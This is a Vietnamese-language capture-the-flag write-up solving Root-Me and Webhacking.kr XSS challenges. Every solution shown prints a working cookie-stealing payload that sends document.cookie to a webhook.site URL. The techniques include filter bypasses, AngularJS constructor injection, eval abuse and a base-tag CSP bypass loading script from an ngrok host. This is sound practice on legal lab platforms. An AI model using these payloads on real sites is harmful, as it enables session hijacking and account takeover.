```
Rootme:
XSS Reflected
XSS-Stored1
XSS-DOM Based introduction
XSS DOM based-AngularJS
XSS DOM Based-Eval
XSS-Stored2
Webhacking.kr:
Baby
Pro
```

# Rootme:
## XSS Reflected
**Description**:`Find a way to steal the administrator’s cookie.` </br>
`Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.`

![image](https://user-images.githubusercontent.com/92881216/223759750-e2d8ceda-23c2-45b4-8594-67202cd35d59.png)

Dạo 1 vòng web em dễ dang tìm được input để inject : `http://challenge01.root-me.org/web-client/ch26/?p=home`. Đó là biến p được gán trên URL. Sau đó em thử nhập 1 số giá trị khác. Khi em nhập `abc` và check source code:

![image](https://user-images.githubusercontent.com/92881216/223760976-75c80c1e-ccf9-4439-9dd3-261963a80d13.png)

![image](https://user-images.githubusercontent.com/92881216/223761390-41b496cb-0603-4967-8240-04568ce9780e.png)

Như vậy đây có thể là chỗ xảy ra XSS và có chức năng report to admin. Mục tiêu bây giờ là phải tìm cách chèn và thực thi được script.

Để ý với giá trị `abc` được nhập thì html được trả về là `<a href="?p=abc">abc</a>`. Nhập tiếp với payload đơn giản `<h1>abc</h1>`, em check source thì được `<p>The page <a href='?p=&lt;h1&gt;abc&lt;/h1&gt;'>&lt;h1&gt;abc&lt;/h1&gt;</a> could not be found.</p>` như vậy ký tự `<`,`>` đã được mã hóa html. Tiếp tục em test với các ký tự khác và biết được `"` cũng bị mã hóa html còn các ký tự như `(`,`)`,`'`,`;` thì không.<br> 
Các payload nhập vào được đưa vào giá trị của attribute `href` nên đây có thể khai thác bằng cách bằng cách escape attribute đó để chèn script độc hại phía sau. Đọc lại mô tả của bài này : `Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.`, em liên tưởng đến việc dùng các event để thực thi script. Và do `'`, `(`, `)` không bị mã hóa nên em thử luôn với payload : `' onmouseover=alert(1) '`, sau đó di chuột vào thì hàm `alert(1)` được thực thi:

![image](https://user-images.githubusercontent.com/92881216/223768238-06c9bb84-d001-4c76-8da1-c740cd746b83.png)

Em tiếp tục viết script để steal cookie và dùng `webhook.site` để xem request:
```
' onmouseover='document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c="+document.cookie' '
```
Nhưng nhận ra bị filter mất dấu cộng nên phải dùng `concat()` và nối chuỗi:
```
' onmouseover='document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie)' '
```
Gửi report cho admin và chờ kết quả:
![image](https://user-images.githubusercontent.com/92881216/223775467-adec68c4-1cfd-42ae-823d-caf0db49f3ff.png)

> `flag=r3fL3ct3D_XsS_fTw`

## XSS-Stored1
**Description:** `Steal the administrator session cookie and use it to validate this chall.`
![image](https://user-images.githubusercontent.com/92881216/223778497-ca220bf7-d02a-496b-9bda-7ac543c3d7a0.png)

Nhìn qua web này có chức năng lưu trữ tin nhắn mình nhập lên:

![image](https://user-images.githubusercontent.com/92881216/223778828-45ae7220-aae7-42af-a33f-587556be73fa.png)

Nhập sơ qua 1 số payload `<h1>abc</h1>` và nhận thấy phần `messenger` có thể bị xss :
![image](https://user-images.githubusercontent.com/92881216/223779206-19d67996-cab2-4323-8a40-cbc6222cd379.png)
Nhập tiếp với payload: `<script>alert(1)</script>`:
![image](https://user-images.githubusercontent.com/92881216/223779378-29d464e1-a754-4386-8771-0c2f616c6a7a.png)
Như vậy web đã thực thi `alert(1)` mà không qua filter gì. Sau đó em nhập thẳng payload:
```
<script>document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie)</script>
```
Chờ 1 lúc nhận được:
![image](https://user-images.githubusercontent.com/92881216/223781330-9dfddad1-95df-47a2-aaf3-62ce92fa4264.png)

> `ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6`

## XSS-DOM Based introduction
**Description:** `Steal the admin’s session cookie.`

![image](https://user-images.githubusercontent.com/92881216/223781835-2bcdb489-ceec-4146-abaf-c2dc39109106.png)

Bài toán ở đây là nhập vào 1 số và đây là chỗ có thể xss. Em thử nhập vào số bất kỳ và xem source:

![image](https://user-images.githubusercontent.com/92881216/223786727-287b16cd-7464-41b9-85b8-8458bb364892.png)

Khi em nhập vào 1 và kết quả `var number = '1';`. `1` được truyền vào biến number và kẹp giữa 2 dấu nháy đơn `'`. <br>
Em nghĩ ngay đến việc dùng nháy đơn để escape ra rồi dùng `;` kết thúc câu lệnh gán đó đồng thời viết tiếp `alert(1);` để test và dùng `//` để comment phần thừa phía sau. Payload: `'; alert(1); //` và đúng như dự đoán web đã thực thi `alert(1)`:

![image](https://user-images.githubusercontent.com/92881216/223787855-0543d1f1-cef1-4b9f-bb34-c219fee1a5bf.png)

Em tiếp tục dùng script để lấy cookie bằng payload: 
```
';document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie);//
```

Và gửi URL trong phần contact: `http://challenge01.root-me.org/web-client/ch32/index.php?number=';document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie);//`

Kết quả: 
![image](https://user-images.githubusercontent.com/92881216/223789126-7828c265-c8fc-4651-a3e6-85d73a600f89.png)

> `flag=rootme{XSS_D0M_BaSed_InTr0}`


## XSS DOM based-AngularJS
**Description:** `Steal the admin’s session cookie.`

![image](https://user-images.githubusercontent.com/92881216/223958684-e8b9af91-bdec-46bc-ad10-f92abd86bf46.png)

Web có chức năng nhập tên và từ tên đó tạo ra một kết quả ngẫu nhiên qua source code dưới, đồng thời có chức năng contact để gửi URL nhằm steal cookie:

![image](https://user-images.githubusercontent.com/92881216/223959499-5675266d-a7e5-45ad-a38d-1bb4dc040992.png)

Khi em nhập payload đơn giản `<h1>abc</h1>` thì ứng dụng đã filter mất ký `<`, `>` :

![image](https://user-images.githubusercontent.com/92881216/223959926-42e6ae25-9e01-40e4-8e12-ff644b2d6b57.png)

Ngoài ra thì ứng dụng còn filter mất `'` vì vậy không thể thoát khỏi `var name = 'abc';` để chèn thêm câu lệnh mới. Sau một lúc quan sát có thể lỗ hổng nằm ở đoạn :`<p id="name_encoded">Result for abc:</p>`. Bài này được viết bằng AngularJS framework. Sau một lúc tìm hiểu thì em biết được cú pháp `{{}}` sử dụng để liên kết dữ liệu giữa các thành phần trên giao diện người dùng và các biến, thuộc tính hoặc hàm trong AngularJS. Em thử với payload đơn giản `{{1+2}}` và kết quả:

![image](https://user-images.githubusercontent.com/92881216/223965095-e0c4b74b-00e2-475d-afe2-d21711707f3e.png)

Việc tiếp theo là em cần 1 hàm hoặc thuộc tính nào đó có thể thực thi được câu lệnh js và em tìm được `{{constructor.constructor("alert(1)")()}}`.<br>
Trong payload này, `constructor` được sử dụng để tạo 1 hàm mới có nội dung `alert(1)` và sau đó dùng `()` để gọi đến và thực thi được hàm vừa tạo.

![image](https://user-images.githubusercontent.com/92881216/223968563-fdabd154-bd80-4755-bf84-39cfd27d9ee6.png)

Như vậy tiếp theo giống với mấy bài trước em dùng script để steal cookie : 
```
document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie)
```

Tuy nhiên khi đưa vào thì có vấn để về sử dụng `"` ứng dụng cũng filter mất `'`. Khi đó em thử test dùng `` ` `` trên trình duyệt chạy thử ``document.location=`https://google.com` ``
và kết quả vẫn redirect sang google. Vậy có thể dùng `` ` `` để thay thế `'` trong trường hợp này, payload khi đó là: 
```
{{constructor.constructor("document.location=`https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=`.concat(document.cookie)")()}}
```
Gửi URL trong phần contact :
```
http://challenge01.root-me.org/web-client/ch35/index.php?name=%7B%7Bconstructor.constructor%28%22document.location%3D%60https%3A%2F%2Fwebhook.site%2F509048d1-6397-4a3f-ac0f-9133e64a24dd%3Fc%3D%60.concat%28document.cookie%29%22%29%28%29%7D%7D
```
Kết quả: 

![image](https://user-images.githubusercontent.com/92881216/223808226-8e80ab23-1efd-4dfd-87a7-316a5b96e564.png)

> `flag=rootme{@NGu1@R_J$_1$_C001}`

## XSS DOM Based-Eval
**Description:** `Steal the admin’s session cookie.`

![image](https://user-images.githubusercontent.com/92881216/223979928-f5bf16eb-fa05-4e11-a011-2aebaa9447ce.png)

Bài toán ở đây nhập vào caculator và có phần contact để gửi url như nhưng bài trên. Trường `calculation` yêu cầu đầu vào là 1 phép tính, nó được kiểm tra bởi regex:`/^\d+[\+|\-|\*|\/]\d+/`

![image](https://user-images.githubusercontent.com/92881216/223980431-3547d1d5-2949-47ef-80ca-075f78acf90c.png)

Khi nhập 1+2 xem kết quả và check source:

![image](https://user-images.githubusercontent.com/92881216/223980604-4a2fb97b-cf1d-4ed7-95b7-0bb496495406.png)

![image](https://user-images.githubusercontent.com/92881216/223980748-a4f40c58-053b-4dbd-9e13-3452737a0097.png)

Như vậy input được đưa vào và tính toán bởi hàm `eval()`. Phân tích 1 chút về regex: `/^\d+[\+|\-|\*|\/]\d+/`, nó yêu cầu bắt đầu bằng 1 số (^\d) tiếp theo là các phép toán `+`, `-`, `*`, `/` và cuối cùng là 1 số . Tuy nhiên regex này lại không check kĩ phần phía sau. Với hàm `eval()` là hàm thực thi biểu thức phía trong và có thể chứ nhiều biểu thức và phân cách bằng dấu `,`, từ đó em test thử payload: `1+2,alert(1)` và nhận được ứng bị bị filter mất `()`, em thử lại với `` 1+2,alert`1` `` và thành công: 

![image](https://user-images.githubusercontent.com/92881216/223985561-c67ada6e-1cbf-4ad0-b4fb-af01899aa2f1.png)

Tiếp tục dùng script steal cookie và payload khi đó:
```
1+2,document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c="+document.cookie
```

URL để gửi:
```
http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B2%2Cdocument%2Elocation%3D%22https%3A%2F%2Fwebhook%2Esite%2F509048d1%2D6397%2D4a3f%2Dac0f%2D9133e64a24dd%3Fc%3D%22%2Bdocument%2Ecookie
```

Gửi URL và chờ kết quả:

![image](https://user-images.githubusercontent.com/92881216/223989291-276adea1-6411-470d-a5c9-e00369760149.png)

> `flag=rootme{Eval_Is_DangER0us}`

## XSS-Stored2
**Description:**` Steal the administrator session’s cookie and go in the admin section.`

![image](https://user-images.githubusercontent.com/92881216/223991750-1bc24d3e-9c86-475c-85b0-88785264baf7.png)

Bài này có chức năng gửi lên 1 tin nhắn sau khi nhập title và messenger, ngoài ra có thêm phần `section=admin`.

Test thử khi nhâp title là `abc` và messenger là `<h1>abc</h1>` thi kết quả in ra :

![image](https://user-images.githubusercontent.com/92881216/223993055-e2e8b398-6db9-41f3-8318-d9c761dbd81b.png)

Sau khi thử mã hóa các kiểu vẫn không được, em tiếp tục quan sát và để ý đến 1 chức năng không có ở bài `Stored1` đó là `status`.

Em mở `Burp Suite` lên để xem request và phát hiện được điều khác biệt là giá trị thuộc tính `status` được lưu trong cookie, đây có thể là chỗ XSS.

![image](https://user-images.githubusercontent.com/92881216/223995896-24459559-ae5f-4e3f-937c-d1e16b6d4587.png)

Em thay đổi giá trị `status` là test và gửi đi: 

![image](https://user-images.githubusercontent.com/92881216/223996547-c2626017-42d0-4ae9-a6e0-f8faedb9e176.png)

Nó được in ra đồng thời giá trị được đưa vào trong attribute `class` của tag i :

![image](https://user-images.githubusercontent.com/92881216/223996995-fb35f0d4-1d12-4e7a-9eb9-d3d13f4b72fa.png)

Em tiếp tục dùng payload : `test"><script>alert(1)</script>` và thành công: 

![image](https://user-images.githubusercontent.com/92881216/223997605-47325256-4151-478d-b3d7-22cf2efb9e49.png)

Cuối cùng em sử dụng script steal cookie như những bài trước:

```
test"><script>document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c="+document.cookie</script>
```

Gửi lên và chờ kết quả: 

![image](https://user-images.githubusercontent.com/92881216/223998867-e73b1e6c-91be-486e-b029-b71de8b6fdc7.png)

> `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`

# Webhacking.kr:
## Baby
Xem qua web và source code thì em nhận thấy biến `inject` có thể là nơi xss và chức năng report là gửi url đến admin, chức năng này là thẻ a và được tạo ra từ file `script.js`.
![image](https://user-images.githubusercontent.com/92881216/224082610-833427cc-e04d-4183-b4cc-fe78a2a9d2cb.png)

![image](https://user-images.githubusercontent.com/92881216/224082906-2bb1fb70-2f5a-41c8-ab5b-5505a6f25069.png)

![image](https://user-images.githubusercontent.com/92881216/224082985-62c0d449-db1a-410d-bd0a-f1a1d4fec103.png)

Đầu tiên em thử với payload đơn gián : `<h1>abc</h1>` được :
![image](https://user-images.githubusercontent.com/92881216/224084380-12b218b6-894f-4ae5-b398-c43cbc4f290c.png)

Tiếp tục với payload `<script>alert(1)</script>` nhưng không có gì xảy ra, em check thử source thì không có gì thay đổi ở payload :

![image](https://user-images.githubusercontent.com/92881216/224084797-94c2db89-9e3b-42b1-8235-38a730107ec3.png)

Tuy nhiên script không được thực thi, em check lại header và biết được web được bảo vệ bởi CSP :

![image](https://user-images.githubusercontent.com/92881216/224085505-b667c2fb-6be7-4bfd-b615-9ff089e54b1a.png)

Với header là  `Content-Security-Policy: script-src 'nonce-QUrU8F7+Vi+GbEFLIHSJxt52Gm8=';` Như vậy giá trị `nonce` được gán vào tag `script` và tag `script` có giá trị `nonce` đó mới được thực thi. Đây là giá trị ngẫu nhiên và được làm mới sau mỗi lần refresh trang và để biết trước được là điều bất khả thi. Em tiếp tục tìm kiếm cách bypass loại này và xem đc bài này : https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#missing-base-uri

Thẻ `script` trong bài này được gắn attribute `scr=/script.js` và web thực thi nội dung trong file script.js. Đây là đường dẫn tương đối và base-uri chưa được định nghĩa và vì vậy ta thể tạo ra một thẻ `base` để xác định base-uri. Ví dụ về thẻ base: `<base href="https://www.attacker.com/">` và khi đó script.js sẽ có đường dẫn tuyệt đối là : `https://www.attacker.com/script.js` và kẻ tấn công có thể thực thi file script.js này của hắn lên ứng dụng web.
Cách thức là vậy, bây giờ em sẽ tiến hành tạo file `script.js` để lấy cookie có nội dung:
```
document.location ="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=" + document.cookie;
```
Cùng với đó là một web server chứa file scrip.js : `https://12bc-42-1-70-84.ap.ngrok.io` sao cho:

![image](https://user-images.githubusercontent.com/92881216/224092598-015a4190-6d83-4ce4-a043-e058390dca3c.png)

Và bây giờ tạo thẻ base đưa vào `?inject=`:
```
<base href="https://12bc-42-1-70-84.ap.ngrok.io/" >
```
Cuối cùng là mã hóa URL và gửi cho admin:
```
?inject=%3Cbase%20href=%22https://12bc-42-1-70-84.ap.ngrok.io/%22%20%3E
```
Kết quả:

![image](https://user-images.githubusercontent.com/92881216/224093333-dd33b73d-16dc-4f56-a93e-5b583d1eda1f.png)

> `flag=FLAG{base_is_basic}`








